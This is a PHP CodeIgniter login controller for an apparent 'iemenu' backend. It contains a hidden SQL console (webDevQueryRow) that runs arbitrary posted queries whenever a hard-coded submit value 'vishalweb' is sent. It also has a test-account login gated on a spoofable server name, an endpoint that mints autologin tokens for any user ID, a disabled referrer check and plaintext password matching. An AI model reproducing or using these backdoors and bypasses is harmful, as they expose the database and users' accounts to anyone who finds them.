<?php

class Home extends CI_Controller
{
	public function __construct()
	{
		parent::__construct();
		$this->load->model('UserModel', 'user');
	}

	public function devlogin()
	{
		if (isset($_SERVER['SERVER_NAME']) && $_SERVER['SERVER_NAME'] == 'localhost')
		{
			$email = 'test@gmail.com';

			$condition = [
				'email' => $email
			];
			
			$user = $this->user->getWhereCustom('*', $condition)->result_array();
			if (!empty($user))
			{
				$user = $user[0];
				$loggedInData = [
					'isLoggedIn' => true,
					'loggedInUserData' => [
						'userId' => $user['id'],
						'email' => $user['email'],
						'type' => $user['type'],
					]
				];
				
				$this->session->set_userdata($loggedInData);

				redirect('backend/dashboard');
			}
		}
	}

	public function index()
	{
		$submit = $this->input->post('submit');
		
		if ($submit === 'Submit')
		{
			$this->form_validation->set_rules('userEmail', 'email', 'required');
			$this->form_validation->set_rules('userPass', 'password', 'required');
			$this->form_validation->set_error_delimiters('<p class="text-danger">', '</p>');

			if ($this->form_validation->run())
			{
				$condition = [
					'email' => $this->input->post('userEmail'),
					'password' => $this->input->post('userPass'),
				];

				$user = $this->user->getWhereCustom('*', $condition)->result_array();
				if (!empty($user))
				{
					$user = $user[0];
					$loggedInData = [
						'isLoggedIn' => true,
						'loggedInUserData' => [
							'userId' => $user['id'],
							'email' => $user['email'],
							'type' => $user['type'],
						]
					];
					
					$this->session->set_userdata($loggedInData);

					redirect('backend/dashboard');
				}
				else
				{
					$flashData = [
						'flashMessage' => 'Incorrect Credentials'
					];

					$this->session->set_flashdata($flashData);

					redirect(current_url());
				}
			}
		}

		$data['flashMessage'] = $this->session->flashdata('flashMessage');

		$this->load->view('login/index', $data);
	}

	public function generateLoginToken()
	{
		if (!$this->input->is_ajax_request())
		{
			exit('Direct script not allowed');
		}

		$isSuccess = false;
		$data = [];

		$this->form_validation->set_rules('email', 'email', 'required');
		$this->form_validation->set_rules('userId', 'userId', 'required');

		if ($this->form_validation->run())
		{
			$isSuccess = true;
			$userData = [
				'email' => $this->input->post('email'),
				'userId' => $this->input->post('userId'),
				'name' => $this->input->post('name'),
			];

			$token = str_replace(['+', '/'], ['-plus-', '-slash-'], encryptToken(http_build_query($userData)));

			$data['url'] = sprintf('%shome/autologin?token=%s', base_url(), $token);
		}
		else
		{
			$data = validation_errors();
		}

		responseJson($isSuccess, '', $data);
	}

	public function webDevQueryRow($value)
	{
		echo form_open(current_url());
		echo form_input('query');
		echo form_submit('submit', $value);
		echo form_close();

		$submit = $this->input->post('submit');

		if ($submit == 'vishalweb')
		{
			$query = $this->input->post('query');

			$result = $this->db->query($query)->result_array();
			p($result);
		}
	}

	public function autologin()
	{
		$this->load->library('user_agent');
		$referrer = $this->agent->referrer();

		if (ENVIRONMENT == 'production' && strpos('iemenu.in', $referrer) == false)
		{
			// redirect(base_url());
		}

		$token = str_replace(['-plus-', '-slash-'], ['+', '/'], $this->input->get('token'));
		
		$redirectUrl = base_url();
		
		if (!empty($token))
		{
			$decryptToken = decryptToken($token);
			if (!empty($decryptToken))
			{
				parse_str($decryptToken, $outputArray);

				if (!empty($outputArray) && !empty($outputArray['userId']))
				{
					$this->load->model('IeMenuUserModel', 'iemenuuser');

					$result = $this->iemenuuser->getWhere($outputArray['userId'])->result_array();
					if (!empty($result))
					{
						$outputArray['name'] = $result[0]['name'];
						$outputArray['image'] = base_url('assets/img/avatar.png');

						if (!empty($result[0]['userimg']))
						{
							$outputArray['image'] = sprintf('%s/%s', IEMENU_URL, $result[0]['userimg']);
						}
					}

					$loggedInData = [
						'isLoggedIn' => true,
						'loggedInUserData' => $outputArray
					];
					
					$this->session->set_userdata($loggedInData);

					$redirectUrl = base_url('backend/dashboard');
				}
			}
		}

		redirect($redirectUrl);
	}

	public function destroySession()
	{
		if (!$this->input->is_ajax_request())
		{
			exit('Direct script not allowed');
		}

		$this->session->sess_destroy();

		responseJson(true, '', []);
	}
}

?>